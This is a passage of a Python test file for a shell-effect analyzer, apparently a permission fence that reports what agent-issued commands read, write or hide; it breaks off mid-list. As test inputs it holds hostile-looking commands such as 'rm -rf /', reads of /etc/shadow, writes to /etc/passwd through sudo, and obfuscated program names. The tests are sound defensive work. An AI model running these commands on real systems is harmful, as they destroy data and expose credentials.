"""The shell-effect model: what a command reads, writes, reaches and hides.

Every expectation below is worked out by hand from the shell's own rules, never
read back from the model. The negatives are the asymmetric traps: a quoted
operator is a character, ``-to`` is ``-t o``, ``>&2`` touches no file, a tilde
mid-word is a tilde, ``{}`` is reported but ``'{a,b}'`` is a name.
"""

from __future__ import annotations

import json
import os
import shlex
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Any

import pytest
from alkera_cli.plugins.plugin_base.permissions.shell import (
    MAX_COMMAND_BYTES,
    MAX_WRAP_DEPTH,
    WRAPPERS,
    ShellEffects,
    analyze_shell,
    backslash_escapes_here,
)

HOME = "/box/work/.alkera/chats/chat-a/scratch"
ENV = {"HOME": HOME, "PATH": "/usr/bin"}


def effects(command: str, env: dict[str, str] | None = ENV, **kwargs: Any) -> ShellEffects:
    return analyze_shell(command, env=env, **kwargs)


def locations(e: ShellEffects) -> list[tuple[str, bool, tuple[str, ...], bool]]:
    return [(loc.text, loc.writing, loc.moved, loc.glob) for loc in e.locations]


def writes(e: ShellEffects) -> list[str]:
    return [loc.text for loc in e.writes]


def reads(e: ShellEffects) -> list[str]:
    return [loc.text for loc in e.reads]


def kinds(e: ShellEffects) -> list[str]:
    return [entry.kind for entry in e.opaque]


def programs(e: ShellEffects) -> list[str]:
    return [inv.program for inv in e.invocations]


# --------------------------------------------------------------------------- #
# Redirections
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        pytest.param("echo hi > out.txt", [("out.txt", True)], id="truncate"),
        pytest.param("echo hi >out.txt", [("out.txt", True)], id="attached"),
        pytest.param("echo hi >> log.txt", [("log.txt", True)], id="append"),
        pytest.param("echo hi >| out.txt", [("out.txt", True)], id="noclobber"),
        pytest.param("ls &> all.log", [("all.log", True)], id="both-streams"),
        pytest.param("ls &>> all.log", [("all.log", True)], id="both-streams-append"),
        pytest.param("ls 2> err.log", [("err.log", True)], id="stderr"),
        pytest.param("ls 2>> err.log", [("err.log", True)], id="stderr-append"),
        pytest.param("ls 1> out.log", [("out.log", True)], id="fd1"),
        pytest.param("echo x 3> /etc/passwd", [("/etc/passwd", True)], id="fd3"),
        pytest.param("echo x 3>/etc/passwd", [("/etc/passwd", True)], id="fd3-attached"),
        pytest.param("echo x >& out.txt", [("out.txt", True)], id="csh-both-to-file"),
        pytest.param("ls > /dev/null 2>&1", [("/dev/null", True)], id="dup-is-not-a-file"),
        pytest.param("ls 2>&1", [], id="dup-stderr"),
        pytest.param("ls >&2", [], id="dup-to-stderr"),
        pytest.param("ls >&-", [], id="close"),
        pytest.param("cat < /etc/passwd", [("/etc/passwd", False)], id="input"),
        pytest.param(
            "sort < in.txt > out.txt", [("in.txt", False), ("out.txt", True)], id="in-and-out"
        ),
        pytest.param("echo x > a.txt > b.txt", [("a.txt", True), ("b.txt", True)], id="twice"),
        pytest.param("> /etc/x echo hi", [("/etc/x", True)], id="before-the-command"),
        pytest.param("echo > /etc/x hi", [("/etc/x", True)], id="between-the-arguments"),
        pytest.param("cat <<EOF > /etc/x\npayload\nEOF", [("/etc/x", True)], id="after-a-heredoc"),
        pytest.param("cat <<EOF\nplain\nEOF", [], id="a-heredoc-writes-nothing"),
        pytest.param("tr a b <<< text", [], id="a-herestring-writes-nothing"),
        pytest.param("echo 'a > b' > real.txt", [("real.txt", True)], id="quoted-arrow-is-text"),
        pytest.param("echo x > 'my notes.txt'", [("my notes.txt", True)], id="quoted-space"),
        pytest.param("echo x > my\\ notes.txt", [("my notes.txt", True)], id="escaped-space"),
        pytest.param('echo x > /etc/pass"wd"', [("/etc/passwd", True)], id="pieces-join"),
        pytest.param(
            "cat a | wc -l > /etc/x", [("/etc/x", True), ("a", False)], id="pipeline-tail"
        ),
        pytest.param(
            "cat a > /etc/x | wc -l", [("/etc/x", True), ("a", False)], id="pipeline-head"
        ),
        pytest.param(
            "(cat a; cat b) > /etc/x",
            [("/etc/x", True), ("a", False), ("b", False)],
            id="on-a-subshell",
        ),
        pytest.param("exec > /etc/x", [("/etc/x", True)], id="exec-with-only-a-redirect"),
    ],
)
def test_a_redirect_names_the_file_it_opens(command: str, expected: list[tuple[str, bool]]) -> None:
    assert [
        (text, writing) for text, writing, _moved, _glob in locations(effects(command))
    ] == expected


@pytest.mark.parametrize(
    ("command", "reason"),
    [
        pytest.param("echo x > $OUT", "$OUT is not a value this fence can read", id="variable"),
        pytest.param(
            "echo x > ${OUT}", "$OUT is not a value this fence can read", id="braced-variable"
        ),
        pytest.param(
            'echo x > "$x.log"', "$x is not a value this fence can read", id="variable-in-a-string"
        ),
        pytest.param(
            "echo x > $(mktemp)", "$(mktemp) runs a command of its own", id="substitution"
        ),
        pytest.param("echo x > `mktemp`", "`mktemp` runs a command of its own", id="backticks"),
        pytest.param(
            "echo x > ~root/x", "~root/x names a home this fence cannot read", id="another-home"
        ),
        pytest.param("echo x > $'\\x41'", "$'\\x41' is expanded by the shell", id="ansi-c"),
    ],
)
def test_a_destination_the_shell_computes_is_reported_not_guessed(
    command: str, reason: str
) -> None:
    e = effects(command)
    assert writes(e) == []
    assert reason in [entry.reason for entry in e.opaque]
    redirect = next(inv for inv in e.invocations if inv.program == "echo").redirects[0]
    assert redirect.writing and redirect.target is None and not redirect.plain


def test_a_process_substitution_destination_is_computed_but_its_command_is_read() -> None:
    e = effects("echo x > >(tee /etc/x)")
    assert writes(e) == ["/etc/x"]
    assert "a subshell this fence cannot read" in [o.reason for o in e.opaque]
    redirect = next(inv for inv in e.invocations if inv.program == "echo").redirects[0]
    assert redirect.target is None and not redirect.plain


def test_a_brace_destination_is_kept_as_text_and_reported() -> None:
    """``{a,b}`` expands to names the model does not compute. The text is still
    judged, so a brace through ``/etc`` is caught, and the command is not
    vouched for."""
    e = effects("echo x > {a,b}")
    assert writes(e) == ["{a,b}"]
    assert "{ is expanded by the shell" in [o.reason for o in e.opaque]
    redirect = e.invocations[0].redirects[0]
    assert redirect.target == "{a,b}" and not redirect.plain


def test_a_destination_built_from_pieces_is_resolved_but_not_plain() -> None:
    """``/dev/n"u"ll`` is ``/dev/null`` to the shell; a consumer that fails
    closed on anything but a plain spelling can still tell."""
    e = effects('grep x f > /dev/n"u"ll')
    assert writes(e) == ["/dev/null"]
    (redirect,) = e.invocations[0].redirects
    assert redirect.target == "/dev/null" and redirect.plain is False
    plain = effects("grep x f > /dev/null").invocations[0].redirects[0]
    assert plain.plain is True


def test_a_substitution_inside_a_destination_still_runs_its_command() -> None:
    e = effects("echo x > $(echo /etc/passwd | tee /tmp/leak)")
    assert programs(e) == ["echo", "echo", "tee"]
    assert writes(e) == ["/tmp/leak"]


def test_a_redirect_on_a_list_lands_where_the_list_has_moved() -> None:
    """tree-sitter binds ``a && b > f`` to the whole list; the shell applies it
    to ``b``, after ``a`` ran. ``cd .. && echo x > a.txt`` writes one level up."""
    e = effects("cd .. && echo x > a.txt")
    assert locations(e) == [("..", False, (), False), ("a.txt", True, ("..",), False)]
    e = effects("cd work && echo hi > a.txt; cat b > c.txt")
    assert locations(e) == [
        ("work", False, (), False),
        ("a.txt", True, ("work",), False),
        ("c.txt", True, ("work",), False),
        ("b", False, ("work",), False),
    ]


def test_every_statement_under_a_redirect_carries_it_for_the_classifier() -> None:
    e = effects("cd work && echo hi > a.txt")
    assert [[r.target for r in inv.redirects] for inv in e.invocations] == [["a.txt"], ["a.txt"]]


def test_a_redirect_with_no_destination_is_a_parse_error_not_a_write_to_nowhere() -> None:
    e = effects("echo hi >")
    assert e.parse_error and not e.readable
    assert writes(e) == []


def test_a_read_write_redirect_opens_the_file_both_ways() -> None:
    e = effects("cat <> /etc/passwd")
    assert [(t, w) for t, w, _m, _g in locations(e)] == [
        ("/etc/passwd", False),
        ("/etc/passwd", True),
    ]
    assert e.parse_error is True


@pytest.mark.parametrize(
    ("command", "expands"),
    [
        pytest.param("cat <<EOF\n$HOME\nEOF", True, id="a-variable"),
        pytest.param("cat <<EOF\n$(cat /etc/shadow)\nEOF", True, id="a-substitution"),
        pytest.param("cat <<EOF\n`id`\nEOF", True, id="backticks"),
        pytest.param("cat <<'EOF'\n$HOME $(x)\nEOF", False, id="quoted-delimiter"),
        pytest.param('cat <<"EOF"\n$HOME\nEOF', False, id="double-quoted-delimiter"),
        pytest.param("cat <<EOF\nplain text\nEOF", False, id="plain"),
        pytest.param("cat <<-EOF\n\t$HOME\n\tEOF", True, id="dash-form"),
    ],
)
def test_a_heredoc_the_shell_expands_is_reported(command: str, expands: bool) -> None:
    e = effects(command)
    assert ("a here-document the shell expands" in [o.reason for o in e.opaque]) is expands


def test_a_command_inside_a_heredoc_body_is_an_invocation() -> None:
    e = effects("cat <<EOF\n$(cat /etc/shadow)\nEOF")
    assert programs(e) == ["cat", "cat"]
    assert reads(e) == ["/etc/shadow"]


def test_an_unterminated_heredoc_is_a_parse_error() -> None:
    e = effects("cat <<EOF\nnever ends")
    assert e.parse_error and not e.readable


# --------------------------------------------------------------------------- #
# Words: quoting, escaping, expansion
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("command", "argv", "dynamic"),
    [
        pytest.param("cat 'a b'", ("a b",), False, id="single-quoted"),
        pytest.param('cat "a b"', ("a b",), False, id="double-quoted"),
        pytest.param("cat a\\ b", ("a b",), False, id="escaped-space"),
        pytest.param('cat "a\\"b"', ('a"b',), False, id="escaped-quote-in-a-string"),
        pytest.param('cat "a\\$b"', ("a$b",), False, id="escaped-dollar-in-a-string"),
        pytest.param('cat "a\\nb"', ("a\\nb",), False, id="other-backslashes-stay"),
        pytest.param("cat '$HOME/x'", ("$HOME/x",), False, id="single-quoted-dollar-is-text"),
        pytest.param("cat '~/x'", ("~/x",), False, id="single-quoted-tilde-is-text"),
        pytest.param('cat "~/x"', ("~/x",), False, id="double-quoted-tilde-is-text"),
        pytest.param("cat ~/notes.md", (f"{HOME}/notes.md",), False, id="tilde"),
        pytest.param("ls ~", (HOME,), False, id="bare-tilde"),
        pytest.param("cat a/~/b", ("a/~/b",), False, id="tilde-mid-word"),
        pytest.param("cat $HOME/notes.md", (f"{HOME}/notes.md",), True, id="variable"),
        pytest.param("cat ${HOME}/notes.md", (f"{HOME}/notes.md",), True, id="braced-variable"),
        pytest.param('cat "$HOME"/notes.md', (f"{HOME}/notes.md",), True, id="quoted-variable"),
        pytest.param('cat /etc/pas"s"wd', ("/etc/passwd",), True, id="pieces"),
        pytest.param("cat /etc/pas''swd", ("/etc/passwd",), True, id="empty-quotes-join"),
        pytest.param("cat x\\*y", ("x*y",), False, id="escaped-star"),
        pytest.param('cat "a*"', ("a*",), False, id="quoted-star"),
        pytest.param("echo 'x; rm -rf /'", ("x; rm -rf /",), False, id="quoted-separator"),
        pytest.param('echo "a && b"', ("a && b",), False, id="quoted-and"),
    ],
)
def test_a_word_is_what_the_shell_hands_on(
    command: str, argv: tuple[str, ...], dynamic: bool
) -> None:
    (inv,) = effects(command).invocations
    assert inv.argv == argv
    assert inv.dynamic is dynamic


@pytest.mark.parametrize(
    ("command", "glob"),
    [
        pytest.param("cat *.md", True, id="star"),
        pytest.param("cat ?.md", True, id="question"),
        pytest.param("cat [ab].md", True, id="bracket"),
        pytest.param("cat '*'", False, id="single-quoted"),
        pytest.param('cat "a*"', False, id="double-quoted"),
        pytest.param("cat a\\*b", False, id="escaped"),
        pytest.param("cat a*'b'", True, id="bare-part-of-a-pieced-word"),
    ],
)
def test_only_an_unquoted_wildcard_is_a_glob(command: str, glob: bool) -> None:
    (loc,) = effects(command).locations
    assert loc.glob is glob


@pytest.mark.parametrize(
    ("command", "kind", "reason"),
    [
        pytest.param(
            "cat $UNSET/x", "variable", "$UNSET is not a value this fence can read", id="unset"
        ),
        pytest.param(
            "cat ${HOME:-x}", "expansion", "${HOME:-x} is expanded by the shell", id="default-form"
        ),
        pytest.param(
            "cat ${#HOME}", "expansion", "${#HOME} is expanded by the shell", id="length-form"
        ),
        pytest.param(
            "cat ${HOME%/*}", "expansion", "${HOME%/*} is expanded by the shell", id="strip-form"
        ),
        pytest.param("cat $1", "expansion", "$1 is expanded by the shell", id="positional"),
        pytest.param("cat $?", "expansion", "$? is expanded by the shell", id="special"),
        pytest.param(
            "cat $((1+1))", "expansion", "$((1+1)) is expanded by the shell", id="arithmetic"
        ),
        pytest.param(
            "cat $[1+1]", "expansion", "$[1+1] is expanded by the shell", id="old-arithmetic"
        ),
        pytest.param("cat $'\\x41'", "expansion", "$'\\x41' is expanded by the shell", id="ansi-c"),
        pytest.param(
            'cat $"/etc/passwd"',
            "expansion",
            'cat $"/etc/passwd" is expanded by the shell',
            id="translated",
        ),
        pytest.param(
            "cat ~root/x",
            "expansion",
            "~root/x names a home this fence cannot read",
            id="another-home",
        ),
        pytest.param(
            "ls ~+", "expansion", "~+ names a home this fence cannot read", id="tilde-plus"
        ),
        pytest.param("cat {a,b}", "expansion", "{ is expanded by the shell", id="brace"),
        pytest.param(
            "cat sub/{a,b}.txt", "expansion", "{ is expanded by the shell", id="brace-inside"
        ),
        pytest.param(
            "cat $(echo x)",
            "substitution",
            "$(echo x) runs a command of its own",
            id="substitution",
        ),
        pytest.param(
            "cat `echo x`", "substitution", "`echo x` runs a command of its own", id="backticks"
        ),
        pytest.param(
            "cat <(ls)", "structure", "a subshell this fence cannot read", id="process-substitution"
        ),
    ],
)
def test_what_the_shell_computes_is_reported_by_kind(command: str, kind: str, reason: str) -> None:
    e = effects(command)
    assert (kind, reason) in [(o.kind, o.reason) for o in e.opaque]
    assert e.invocations[0].dynamic is True


def test_without_an_environment_every_expansion_is_unresolved() -> None:
    assert effects("cat ~/x", env=None).readable is False
    assert effects("cat $HOME/x", env=None).readable is False
    assert effects("cat ~/x").readable is True


def test_a_variable_the_environment_carries_resolves_to_its_value() -> None:
    e = analyze_shell("cat $DATA/rows.csv", env={"DATA": "/srv/data"})
    assert reads(e) == ["/srv/data/rows.csv"]
    assert e.readable


def test_a_brace_is_kept_as_text_so_a_destination_through_it_is_still_judged() -> None:
    e = effects("xargs -I{} cp {} /tmp")
    assert writes(e) == ["/tmp"]
    assert "expansion" in kinds(e)


# --------------------------------------------------------------------------- #
# Names: how a program is spelled
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("rm -rf x", id="plain"),
        pytest.param("'rm' -rf x", id="single-quoted"),
        pytest.param('"rm" -rf x', id="double-quoted"),
        pytest.param("r''m -rf x", id="split-by-empty-quotes"),
        pytest.param('r"m" -rf x', id="split-by-a-string"),
        pytest.param("\\rm -rf x", id="leading-backslash"),
        pytest.param("r\\m -rf x", id="inner-backslash"),
        pytest.param("/bin/rm -rf x", id="absolute-path"),
        pytest.param("./rm -rf x", id="relative-path"),
        pytest.param("../../bin/rm -rf x", id="climbing-path"),
    ],
)
def test_a_program_is_known_by_its_basename_however_it_is_spelled(command: str) -> None:
    (inv,) = effects(command).invocations
    assert inv.program == "rm"
    assert inv.argv == ("-rf", "x")


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("$CMD -rf x", id="variable"),
        pytest.param("$(which rm) -rf x", id="substitution"),
        pytest.param("r${M} -rf x", id="pieced-with-a-variable"),
    ],
)
def test_a_name_the_shell_computes_is_an_invocation_of_nothing_in_particular(command: str) -> None:
    inv = effects(command).invocations[0]
    assert inv.name == "" and inv.program == "" and inv.dynamic is True


# --------------------------------------------------------------------------- #
# Wrappers and nested shells
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("command", "inner"),
    [
        pytest.param("sudo rm -rf x", ("rm", ("-rf", "x")), id="sudo"),
        pytest.param("sudo -u root tee /etc/hosts", ("tee", ("/etc/hosts",)), id="sudo-u"),
        pytest.param("sudo --user=root -E rm x", ("rm", ("x",)), id="sudo-long-user"),
        pytest.param("doas -u root rm x", ("rm", ("x",)), id="doas"),
        pytest.param("env FOO=1 BAR=2 rm x", ("rm", ("x",)), id="env-assignments"),
        pytest.param("env -i -u PATH rm x", ("rm", ("x",)), id="env-flags"),
        pytest.param("timeout 5 rm x", ("rm", ("x",)), id="timeout"),
        pytest.param("timeout -s KILL 5 rm x", ("rm", ("x",)), id="timeout-signal"),
        pytest.param("timeout -k 2 5 rm x", ("rm", ("x",)), id="timeout-kill-after"),
        pytest.param("timeout --signal=KILL 5 rm x", ("rm", ("x",)), id="timeout-long-signal"),
        pytest.param("nice rm x", ("rm", ("x",)), id="nice"),
        pytest.param("nice -n 10 rm x", ("rm", ("x",)), id="nice-n"),
        pytest.param("nice -10 rm x", ("rm", ("x",)), id="nice-bare-number"),
        pytest.param("ionice -c 3 rm x", ("rm", ("x",)), id="ionice-class"),
        pytest.param("ionice -c3 rm x", ("rm", ("x",)), id="ionice-attached"),
        pytest.param("chrt -f 10 rm x", ("rm", ("x",)), id="chrt-priority"),
        pytest.param("stdbuf -oL rm x", ("rm", ("x",)), id="stdbuf-attached"),
        pytest.param("stdbuf -o L rm x", ("rm", ("x",)), id="stdbuf-detached"),
        pytest.param("watch -n 1 rm x", ("rm", ("x",)), id="watch-interval"),
        pytest.param("nohup rm x", ("rm", ("x",)), id="nohup"),
        pytest.param("setsid rm x", ("rm", ("x",)), id="setsid"),
        pytest.param("time rm x", ("rm", ("x",)), id="time"),
        pytest.param("command rm x", ("rm", ("x",)), id="command"),
        pytest.param("builtin cd /etc", ("cd", ("/etc",)), id="builtin"),
        pytest.param("exec rm x", ("rm", ("x",)), id="exec"),
        pytest.param("xargs -0 rm", ("rm", ()), id="xargs-flag"),
        pytest.param("xargs -I {} cp {} /tmp", ("cp", ("{}", "/tmp")), id="xargs-replace"),
        pytest.param("xargs -n1 tee /etc/x", ("tee", ("/etc/x",)), id="xargs-attached-value"),
        pytest.param("busybox rm x", ("rm", ("x",)), id="busybox"),
        pytest.param("coproc rm x", ("rm", ("x",)), id="coproc"),
        pytest.param("proxychains curl https://x", ("curl", ("https://x",)), id="proxychains"),
        pytest.param("sudo nice timeout 5 rm x", ("rm", ("x",)), id="three-deep"),
    ],
)
def test_a_wrapper_is_read_through_to_the_command_it_runs(
    command: str, inner: tuple[str, tuple[str, ...]]
) -> None:
    e = effects(command)
    (inv,) = e.invocations
    assert (inv.program, inv.argv) == inner
    assert inv.depth >= 1
    assert set(e.wrappers) <= WRAPPERS
    assert all(o.kind == "wrapper" for o in e.opaque if o.text in WRAPPERS)
    assert not e.readable


def test_xargs_hands_its_inner_command_arguments_from_stdin() -> None:
    (inv,) = effects("xargs rm").invocations
    assert inv.dynamic is True
    (inv,) = effects("sudo rm x").invocations
    assert inv.dynamic is False


def test_env_with_a_chdir_moves_the_inner_command() -> None:
    e = effects("env -C /etc tee hosts")
    assert locations(e) == [("/etc", False, (), False), ("hosts", True, ("/etc",), False)]


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("sudo -s", id="sudo-shell"),
        pytest.param("sudo -i", id="sudo-login"),
        pytest.param("env -S 'rm -rf x'", id="env-split-string"),
    ],
)
def test_a_wrapper_that_opens_a_shell_is_a_shell(command: str) -> None:
    (inv,) = effects(command).invocations
    assert inv.role == "shell"


def test_a_bare_wrapper_runs_nothing_and_a_bare_env_prints_the_environment() -> None:
    (inv,) = effects("sudo").invocations
    assert inv.role == "wrapper" and not effects("sudo").readable
    env = effects("env")
    assert env.invocations[0].role == "wrapper" and env.readable


def test_past_the_depth_limit_a_wrapper_is_an_ordinary_program() -> None:
    chain = " ".join(["sudo", "nice", "nohup", "setsid", "timeout", "5", "rm", "-rf", "x"])
    (inv,) = effects(chain).invocations
    assert inv.program == "timeout" and inv.depth == MAX_WRAP_DEPTH
    assert inv.argv == ("5", "rm", "-rf", "x")


@pytest.mark.parametrize(
    ("command", "inner", "via_shell"),
    [
        pytest.param("bash -c 'rm -rf x'", ["rm"], True, id="bash"),
        pytest.param('sh -c "echo hi > /tmp/y"', ["echo"], True, id="sh"),
        pytest.param("bash -e -u -c 'rm x'", ["rm"], True, id="with-flags-before-c"),
        pytest.param("zsh -c 'tee /etc/x'", ["tee"], True, id="zsh"),
        pytest.param("su -c 'rm x' root", ["rm"], True, id="su"),
        pytest.param("eval 'rm -rf x'", ["rm"], False, id="eval-quoted"),
        pytest.param("eval rm -rf x", ["rm"], False, id="eval-words"),
        pytest.param("sh -c \"bash -c 'rm x'\"", ["rm"], True, id="nested-twice"),
    ],
)
def test_a_nested_shells_script_is_read(command: str, inner: list[str], via_shell: bool) -> None:
    e = effects(command)
    assert programs(e) == inner
    assert all(inv.via_shell is via_shell for inv in e.invocations)
    assert all(inv.depth >= 1 for inv in e.invocations)
    assert "shell" in kinds(e) and not e.readable


def test_a_nested_shell_reports_the_locations_its_script_names() -> None:
    e = effects("bash -c 'echo hi > /tmp/y; cat /etc/passwd'")
    assert [(t, w) for t, w, _m, _g in locations(e)] == [("/tmp/y", True), ("/etc/passwd", False)]


def test_a_cd_inside_a_nested_shell_moves_nothing_outside() -> None:
    e = effects("bash -c 'cd /tmp && cat x'; cat y")
    assert locations(e) == [
        ("/tmp", False, (), False),
        ("x", False, ("/tmp",), False),
        ("y", False, (), False),
    ]


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("bash script.sh", id="a-script-file"),
        pytest.param("bash < payload.sh", id="stdin"),
        pytest.param('sh -c "$CMD"', id="a-dynamic-script"),
        pytest.param('sh -c "$(cat payload)"', id="a-substituted-script"),
        pytest.param("sh", id="bare"),
    ],
)
def test_a_shell_whose_script_cannot_be_read_is_a_shell_invocation(command: str) -> None:
    e = effects(command)
    assert [inv.role for inv in e.invocations if inv.program == "sh" or inv.program == "bash"] == [
        "shell"
    ]
    assert "interpreter" in kinds(e)


@pytest.mark.parametrize(
    "command",
    [pytest.param('eval "$PAYLOAD"', id="dynamic"), pytest.param("eval", id="empty")],
)
def test_an_eval_of_text_it_cannot_read_is_an_eval_invocation(command: str) -> None:
    (inv,) = effects(command).invocations
    assert inv.role == "eval"


def _nested_shells(levels: int) -> str:
    command = "rm -rf x"
    for _ in range(levels):
        command = f"sh -c {shlex.quote(command)}"
    return command


def test_nested_shells_are_read_up_to_the_depth_limit_and_left_unread_past_it() -> None:
    read = effects(_nested_shells(MAX_WRAP_DEPTH))
    assert programs(read) == ["rm"]
    assert read.invocations[0].depth == MAX_WRAP_DEPTH
    unread = effects(_nested_shells(MAX_WRAP_DEPTH + 1))
    assert "rm" not in programs(unread)
    assert unread.invocations[-1].role == "shell"


# --------------------------------------------------------------------------- #
# Interpreters and programs the model does not read
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("python -c 'import os'", id="python"),
        pytest.param("python3 analyse.py", id="python3"),
        pytest.param("node -e 'x'", id="node"),
        pytest.param("deno run x.ts", id="deno"),
        pytest.param("bun x.ts", id="bun"),
        pytest.param("ruby -e 'x'", id="ruby"),
        pytest.param("perl -i -pe s/a/b/ f", id="perl"),
        pytest.param("php -r 'x'", id="php"),
        pytest.param("Rscript x.R", id="rscript"),
    ],
)
def test_a_code_interpreter_is_an_interpreter_invocation(command: str) -> None:
    (inv,) = effects(command).invocations
    assert inv.role == "interpreter"
    assert kinds(effects(command)) == ["interpreter"]


@pytest.mark.parametrize(
    ("command", "program"),
    [
        pytest.param("sed -i s/a/b/ f", "sed", id="sed"),
        pytest.param("awk '{print > \"/tmp/x\"}' f", "awk", id="awk"),
        pytest.param("find . -name '*.csv'", "find", id="find"),
        pytest.param("ssh host rm x", "ssh", id="ssh"),
        pytest.param("scp f host:/tmp", "scp", id="scp"),
        pytest.param("source payload.sh", "source", id="source"),
        pytest.param(". payload.sh", ".", id="dot"),
        pytest.param("script -c 'rm x' /dev/null", "script", id="script"),
        pytest.param("csh -c 'rm x'", "csh", id="csh"),
    ],
)
def test_a_program_that_runs_a_language_of_its_own_is_opaque_but_still_a_program(
    command: str, program: str
) -> None:
    e = effects(command)
    (inv,) = e.invocations
    assert inv.program == program and inv.role == "program"
    assert e.opaque[0].kind == "interpreter"
    assert e.opaque[0].reason == f"{program} carries a command this fence cannot read"


@pytest.mark.parametrize(
    "command",
    [
        pytest.param("touch x", id="touch"),
        pytest.param("mkdir -p a/b", id="mkdir"),
        pytest.param("rm -rf x", id="rm"),
        pytest.param("git status", id="git"),
        pytest.param("make build", id="make"),
        pytest.param("somebinary notes.md", id="unknown"),
        pytest.param("tar -xf p.tar -C /", id="tar"),
    ],
)
def test_a_program_in_no_table_is_reported_as_one_whose_reach_is_unknown(command: str) -> None:
    e = effects(command)
    program = command.split()[0]
    assert e.opaque == (e.opaque[0],)
    assert e.opaque[0].kind == "program"
    assert e.opaque[0].reason == f"{program} is a program whose reach this fence cannot read"
    assert e.locations == ()


# --------------------------------------------------------------------------- #
# Programs the model reads
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        pytest.param("cp src.txt dst.txt", [("src.txt", False), ("dst.txt", True)], id="cp"),
        pytest.param("cp -r a b out/", [("a", False), ("b", False), ("out/", True)], id="cp-many"),
        pytest.param("cp -t /etc a b", [("a", False), ("b", False), ("/etc", True)], id="cp-t"),
        pytest.param("cp -rt /etc a", [("a", False), ("/etc", True)], id="cp-rt"),
        pytest.param("cp -vt /etc a b", [("a", False), ("b", False), ("/etc", True)], id="cp-vt"),
        pytest.param(
            "cp --target-directory=/etc a", [("a", False), ("/etc", True)], id="cp-target-eq"
        ),
        pytest.param(
            "cp --target-directory /etc a", [("a", False), ("/etc", True)], id="cp-target-space"
        ),
        pytest.param("cp -- -t /etc", [("-t", False), ("/etc", True)], id="cp-dashdash"),
        pytest.param("mv a b", [("a", False), ("b", True), ("a", True)], id="mv-moves-its-source"),
        pytest.param(
            "mv -t /etc a", [("a", False), ("/etc", True), ("a", True)], id="mv-t-moves-its-source"
        ),
        pytest.param(
            "install a /usr/local/bin/b", [("a", False), ("/usr/local/bin/b", True)], id="install"
        ),
        pytest.param("echo hi | tee a.txt b.txt", [("a.txt", True), ("b.txt", True)], id="tee"),
        pytest.param("echo hi | tee -a a.txt", [("a.txt", True)], id="tee-append"),
        pytest.param("echo hi | tee -- -x", [("-x", True)], id="tee-dashdash"),
        pytest.param("echo hi | tee", [], id="tee-nothing"),
        pytest.param(
            "dd if=/dev/zero of=big.bin", [("/dev/zero", False), ("big.bin", True)], id="dd"
        ),
        pytest.param("dd if=/dev/zero", [("/dev/zero", False)], id="dd-no-of"),
        pytest.param("truncate -s 0 app.log", [("app.log", True)], id="truncate"),
        pytest.param("rsync -a a/ b/", [("a/", False), ("b/", True)], id="rsync-local"),
        pytest.param("cat notes.md", [("notes.md", False)], id="cat"),
        pytest.param("grep /etc/passwd notes.md", [("notes.md", False)], id="grep-pattern-first"),
        pytest.param("grep -e x notes.md", [("notes.md", False)], id="grep-named-pattern"),
        pytest.param("rg --files /", [("/", False)], id="rg-files"),
        pytest.param("rg --files", [], id="rg-files-here"),
        pytest.param("cut -d / -f1 notes.md", [("notes.md", False)], id="cut-delimiter"),
        pytest.param("head -n 5 notes.md", [("notes.md", False)], id="head-lines"),
        pytest.param("cmd --opt=/etc/shadow", [], id="unknown-program-options-are-not-read"),
        pytest.param(
            "stat --format=%s /etc/shadow", [("/etc/shadow", False)], id="stat-format-value"
        ),
        pytest.param(
            "grep -f/etc/shadow x", [("/etc/shadow", False), ("x", False)], id="glued-short-value"
        ),
        pytest.param(
            "grep --file=/etc/shadow x",
            [("/etc/shadow", False), ("x", False)],
            id="long-value-is-a-path",
        ),
        pytest.param(
            "ps eww -p 1234",
            [("/proc", False), ("/proc/all/environ", False)],
            id="ps-reads-proc-and-every-environ",
        ),
        pytest.param("pgrep -f x", [("/proc", False)], id="pgrep-reads-proc"),
        pytest.param("echo /etc/passwd", [], id="echo-is-pathless"),
        pytest.param("printenv HOME", [], id="printenv-is-pathless"),
        pytest.param(
            "[ -f /etc/passwd ]", [("/etc/passwd", False), ("]", False)], id="test-brackets"
        ),
        pytest.param("test -f /etc/passwd", [("/etc/passwd", False)], id="test-word"),
        pytest.param(
            "less -o /tmp/out in", [("in", False), ("/tmp/out", True)], id="less-log-file"
        ),
        pytest.param(
            "less --log-file=/tmp/out in",
            [("in", False), ("/tmp/out", True)],
            id="less-log-file-long",
        ),
        pytest.param("tree -o /tmp/out", [("/tmp/out", True)], id="tree-o"),
        pytest.param("tree -L 2 src", [("src", False)], id="tree-depth"),
        pytest.param("wget -O /tmp/x https://e/x", [("/tmp/x", True)], id="wget-O"),
        pytest.param("wget -P /tmp https://e/x", [("/tmp", True)], id="wget-P"),
    ],
)
def test_a_known_program_names_what_it_reads_and_writes(
    command: str, expected: list[tuple[str, bool]]
) -> None:
    assert [(t, w) for t, w, _m, _g in locations(effects(command))] == expected


@pytest.mark.parametrize(
    ("command", "expected_writes", "unnamed"),
    [
        pytest.param("sort -o out in", ["out"], False, id="sort-o"),
        pytest.param("sort -oout in", ["out"], False, id="sort-o-attached"),
        pytest.param("sort -uo out in", ["out"], False, id="sort-o-bundled-last"),
        pytest.param("sort --output=out in", ["out"], False, id="sort-output-eq"),
        pytest.param("sort --output out in", ["out"], False, id="sort-output-space"),
        pytest.param("sort --outp=out in", ["out"], False, id="sort-output-abbreviated"),
        pytest.param("sort --o=out in", ["out"], False, id="sort-output-shortest"),
        pytest.param("sort --outpu out in", ["out"], False, id="sort-output-abbreviated-space"),
        pytest.param("sort -to in", [], False, id="sort-to-is-a-separator"),
        pytest.param("sort -t o in", [], False, id="sort-t-o-is-a-separator"),
        pytest.param("sort -k2 -- in", [], False, id="sort-end-of-options"),
        pytest.param("sort -o", [], True, id="sort-o-with-nothing"),
        pytest.param("sort in", [], False, id="sort-plain"),
        pytest.param("uniq in out", ["out"], False, id="uniq-two"),
        pytest.param("uniq -c in out", ["out"], False, id="uniq-flag-two"),
